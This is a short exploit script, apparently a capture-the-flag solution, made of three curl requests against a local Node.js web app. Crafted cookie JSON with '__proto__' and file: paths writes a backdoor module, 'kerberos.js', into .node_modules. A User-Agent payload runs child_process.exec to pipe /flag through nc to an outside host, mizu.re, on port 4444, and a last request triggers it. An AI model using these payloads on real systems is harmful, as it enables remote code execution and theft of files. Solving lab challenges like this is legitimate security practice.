# Create malicious folder
curl -H 'Cookie: log=j:{"origin":"random","href":"random","protocol":"file:","hostname":"","pathname":"/home/challenge/.node_modules/","__proto__":[]}'  http://localhost:3000/

# Backdoor the application
curl -H 'User-Agent: */require("child_process").exec("cat /flag | nc mizu.re 4444")' -H 'Cookie: log=j:{"origin":"random","href":"random","protocol":"file:","hostname":"","pathname":"/home/challenge/.node_modules/kerberos.js","__proto__":[]}'  http://localhost:3000/*

# Trigger the payload
curl -H 'Cookie: log=j:{"origin":"random","href":"random","protocol":"file:","hostname":"","pathname":"/a/a/a","__proto__":[]}'  http://localhost:3000/
